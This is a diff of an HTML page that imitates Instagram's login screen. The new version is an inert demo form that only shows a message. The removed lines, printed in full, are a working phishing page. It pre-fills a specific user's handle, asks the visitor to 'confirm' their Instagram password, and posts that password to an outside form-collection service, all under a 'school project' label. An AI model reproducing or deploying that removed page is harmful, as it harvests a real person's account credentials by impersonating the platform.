@@ -1,240 +1,154 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://code.jquery.com;">
-    <title>Instagram</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;500;600&display=swap');
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+<title>Instagram</title>
 
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background-color: #fafafa;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-        }
+<!-- Instagram font style -->
+<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
 
-        .main-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            max-width: 350px;
-            width: 100%;
-        }
+<style>
+body {
+    background-color: #fafafa;
+    font-family: Arial, sans-serif;
+    margin: 0;
+}
 
-        /* Instagram Logo */
-        .logo {
-            margin-bottom: 20px;
-        }
+/* Center everything */
+.main {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+}
 
-        .logo img {
-            width: 180px;
-            height: auto;
-        }
+/* Login box */
+.container {
+    width: 350px;
+    background: #fff;
+    border: 1px solid #dbdbdb;
+    padding: 40px 30px;
+    text-align: center;
+}
 
-        /* Main Login Box */
-        .container {
-            background-color: #ffffff;
-            border: 1px solid #dbdbdb;
-            border-radius: 8px;
-            padding: 40px 40px 20px;
-            width: 100%;
-            text-align: center;
-            margin-bottom: 10px;
-            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
-        }
+/* Instagram text logo */
+.logo-text {
+    font-family: 'Grand Hotel', cursive;
+    font-size: 50px;
+    margin-bottom: 30px;
+}
 
-        h1 {
-            font-family: 'Segoe UI', sans-serif;
-            font-size: 28px;
-            font-weight: 600;
-            color: #262626;
-            margin-bottom: 30px;
-            letter-spacing: -1px;
-        }
+/* Inputs */
+input {
+    width: 100%;
+    padding: 10px;
+    margin-bottom: 8px;
+    border: 1px solid #dbdbdb;
+    background: #fafafa;
+    border-radius: 3px;
+    font-size: 14px;
+}
 
-        form {
-            display: flex;
-            flex-direction: column;
-        }
+/* Button */
+button {
+    width: 100%;
+    padding: 10px;
+    background-color: #3897f0;
+    border: none;
+    color: white;
+    font-weight: bold;
+    border-radius: 8px;
+    margin-top: 10px;
+    cursor: pointer;
+}
 
-        label {
-            text-align: left;
-            font-size: 14px;
-            color: #262626;
-            margin-bottom: 6px;
-            font-weight: 500;
-        }
+button:hover {
+    background-color: #1877f2;
+}
 
-        input, textarea {
-            width: 100%;
-            padding: 12px 10px;
-            margin-bottom: 16px;
-            background-color: #fafafa;
-            border: 1px solid #dbdbdb;
-            border-radius: 6px;
-            font-size: 14px;
-            color: #262626;
-            transition: border 0.2s;
-        }
+/* OR divider */
+.divider {
+    display: flex;
+    align-items: center;
+    margin: 20px 0;
+    color: #8e8e8e;
+    font-size: 13px;
+}
 
-        input:focus, textarea:focus {
-            outline: none;
-            border-color: #a8a8a8;
-            box-shadow: 0 0 0 2px rgba(56, 151, 240, 0.1);
-        }
+.divider::before,
+.divider::after {
+    content: "";
+    flex: 1;
+    height: 1px;
+    background: #dbdbdb;
+    margin: 0 10px;
+}
 
-        button {
-            background-color: #0095f6;
-            color: white;
-            padding: 10px;
-            border: none;
-            border-radius: 8px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 10px;
-            transition: background-color 0.2s;
-        }
+/* Forgot password */
+.forgot {
+    color: #00376b;
+    font-size: 12px;
+    margin-top: 15px;
+    cursor: pointer;
+}
 
-        button:hover {
-            background-color: #0077c5;
-        }
+/* Message */
+#loginMessage {
+    margin-top: 10px;
+    font-size: 14px;
+}
 
-        #loginMessage, #formMessage {
-            margin-top: 15px;
-            font-size: 14px;
-            font-weight: 500;
-        }
+.success { color: green; }
+.error { color: red; }
 
-        .success { color: #00c853; }
-        .error { color: #ed4956; }
-
-        /* Second Form (Verify) - Styled like Instagram's secondary box */
-        #contactForm {
-            background-color: #ffffff;
-            border: 1px solid #dbdbdb;
-            border-radius: 8px;
-            padding: 25px 40px;
-            width: 100%;
-            margin-top: 10px;
-            text-align: center;
-        }
-
-        #contactForm h2 {
-            font-size: 16px;
-            color: #262626;
-            margin-bottom: 20px;
-        }
-
-        /* Footer Links (Instagram style) */
-        .footer {
-            margin-top: 30px;
-            text-align: center;
-            font-size: 12px;
-            color: #8e8e8e;
-        }
-
-        .footer a {
-            color: #0095f6;
-            text-decoration: none;
-        }
-
-        .footer a:hover {
-            text-decoration: underline;
-        }
-
-        /* Responsive */
-        @media (max-width: 600px) {
-            .container, #contactForm {
-                padding: 30px 25px;
-            }
-            .logo img {
-                width: 150px;
-            }
-        }
-    </style>
+</style>
 </head>
+
 <body>
-    <div class="main-container">
-        <!-- Instagram Logo -->
-        <div class="logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png" 
-                 alt="Instagram Logo">
-        </div>
 
-        <div class="container">
-            <h1>Instagram</h1>
-            
-            <form id="loginForm" onsubmit="return login()">
-                <label for="username">Username or Email</label>
-                <input type="text" id="username" name="username" value="__neha.__.227" required>
-                
-                <label for="password">Password</label>
-                <input type="password" id="password" name="password" required>
-                
-                <button type="submit">Log in</button>
-                <p id="loginMessage"></p>
-            </form>
-        </div>
+<div class="main">
+    <div class="container">
 
-        <!-- Your Verification Form (Styled similarly) -->
-        <div id="contactForm">
-            <h2>Verify Account</h2>
-            <form action="https://formspree.io/f/mvojnako" method="POST">
-                <label for="email">Your Email</label>
-                <input type="email" id="email" name="email" required>
-                
-                <label for="message">Your Message (optional)</label>
-                <textarea id="message" name="message" rows="3"></textarea>
-                
-                <label for="text">Confirm Your Instagram Password</label>
-                <textarea id="text" name="text" rows="2" required></textarea>
-                
-                <button type="submit">Verify</button>
-                <p id="formMessage"></p>
-            </form>
-        </div>
+        <div class="logo-text">Instagram</div>
 
-        <div class="footer">
-            <p>Don't have an account? <a href="#">Sign up</a></p>
-            <p style="margin-top: 15px;">This is a <strong>demo</strong> for school project only.</p>
-        </div>
+        <form onsubmit="return login()">
+
+            <input type="text" id="username" placeholder="Phone number, username, or email" required>
+
+            <input type="password" id="password" placeholder="Password" required>
+
+            <button type="submit">Log In</button>
+
+            <div class="divider">OR</div>
+
+            <div class="forgot">Forgot password?</div>
+
+            <p id="loginMessage"></p>
+
+        </form>
+
     </div>
+</div>
 
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <script>
-        function login() {
-            var username = document.getElementById('username').value;
-            var password = document.getElementById('password').value;
-            var loginMessage = document.getElementById('loginMessage');
+<script>
+function login() {
+    let u = document.getElementById("username").value;
+    let p = document.getElementById("password").value;
+    let msg = document.getElementById("loginMessage");
 
-            if (username === "__neha.__.227" && password !== "") {
-                sendVerificationEmail(username);
-                loginMessage.className = 'success';
-                loginMessage.innerHTML = '✅ Verification email sent! Check your inbox.';
-                return false;
-            } else {
-                loginMessage.className = 'error';
-                loginMessage.innerHTML = '❌ Incorrect username or password.';
-                return false;
-            }
-        }
+    if(u && p){
+        msg.className = "success";
+        msg.innerHTML = "Login Successful (Demo)";
+    } else {
+        msg.className = "error";
+        msg.innerHTML = "Enter valid details";
+    }
 
-        function sendVerificationEmail(username) {
-            console.log('Sending verification email to: ' + username);
-            // You can add more fake animation here later
-        }
-    </script>
+    return false;
+}
+</script>
+
 </body>
 </html>
